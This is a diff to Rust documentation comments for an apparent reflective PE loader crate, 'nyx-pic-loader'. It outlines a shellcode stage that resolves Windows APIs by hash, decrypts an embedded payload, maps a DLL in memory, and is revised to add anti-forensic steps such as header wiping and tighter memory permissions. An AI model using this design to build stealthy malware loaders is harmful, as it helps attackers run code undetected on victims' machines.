@@ -2,7 +2,7 @@
 //! reflective PE loader used to verify and exercise the mapping logic.
 //!
 //! **Loader status: Layer 2 is live.** The on-target "Layer 2"
-//! decrypt + reflective load sequence (PEB walk, RWX alloc, inline
+//! decrypt + reflective load sequence (PEB walk, RW alloc, inline
 //! ChaCha20-Poly1305 decrypt, reflective PE map, `DllMain` call) ships as the
 //! `nyx-pic-loader` crate, compiled to a raw PIC binary and embedded via
 //! [`crate::on_target::LAYER2_CODE`] (the previous `LAYER2_PEB_WALK` byte blob
@@ -590,11 +590,11 @@ fn resolve_imports(
 //     replaces the historical `PIC_STUB` retained above as a byte-stable
 //     reference.
 //   * `LAYER2_CODE` — the raw pic-loader PIC shellcode: PEB walk to resolve
-//     `kernel32!{VirtualAlloc,LoadLibraryA,GetProcAddress}` by djb2 hash,
-//     RWX allocation, inline ChaCha20-Poly1305 decrypt (key pointed to by
-//     the bridge at `KEY_PATCH_OFFSET`, nonce read from the NYX2 header),
-//     reflective PE map (sections + DIR64 relocs + IAT), then
-//     `DllMain(base, DLL_PROCESS_ATTACH, NULL)`.
+//     `kernel32!{VirtualAlloc,LoadLibraryA,GetProcAddress,VirtualProtect}` by
+//     djb2 hash, RW allocation, inline ChaCha20-Poly1305 decrypt (key pointed
+//     to by the bridge at `KEY_PATCH_OFFSET`, nonce read from the NYX2
+//     header), reflective PE map (sections + DIR64 relocs + IAT + header wipe
+//     + per-section RX/RW/R), then `DllMain(base, DLL_PROCESS_ATTACH, NULL)`.
 //   * `find_magic_offset` — the pure host-side model of the Layer-1 scan loop,
 //     extracted for unit testing without a Windows target.
 //
